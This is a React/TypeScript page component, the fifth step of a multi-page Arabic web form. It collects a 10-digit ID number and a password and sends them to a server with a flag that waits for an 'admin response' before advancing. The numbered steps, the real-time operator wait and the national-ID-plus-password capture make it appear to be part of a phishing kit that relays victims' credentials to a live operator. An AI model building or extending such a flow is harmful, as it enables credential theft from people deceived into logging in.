import Input from "@/components/Input";
import Main from "@/components/Main";
import { Button } from "@/components/ui/button";
import { MAIN_BTN } from "@/constants/data";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import { mainInfo } from "../../real-time/context/signals";

function Page5() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });

  function sendData(data: FieldValues) {
    sendDataToServer({
      data,
      current: "page5",
      nextPage: "page6",
      waitingForAdminResponse: true,
    });
  }

  useEffect(() => {
    // This Step Are Necessary
    setCurrentPage("page5");
  }, []);
  return (
    <Main>
      <form
        className="flex flex-col gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <Input
          errors={errors}
          register={register}
          id="idNumber"
          label="رقم"
          type="number"
          isAr
          value={mainInfo.value?.idNumber}
          options={{
            required: "هذا الحقل ضروري",
            pattern: {
              value: /^[0-9]{10}$/,
              message: "يجب كتابة عشر أرقام",
            },
          }}
        />
        <Input
          errors={errors}
          register={register}
          id="password"
          label="كلمة المرور"
          type="password"
          isAr
          options={{
            required: "هذه الحقل ضروري",
          }}
        />

        <Button className={MAIN_BTN + " w-[150px] mx-auto"}>التالي</Button>
      </form>
    </Main>
  );
}

export default Page5;
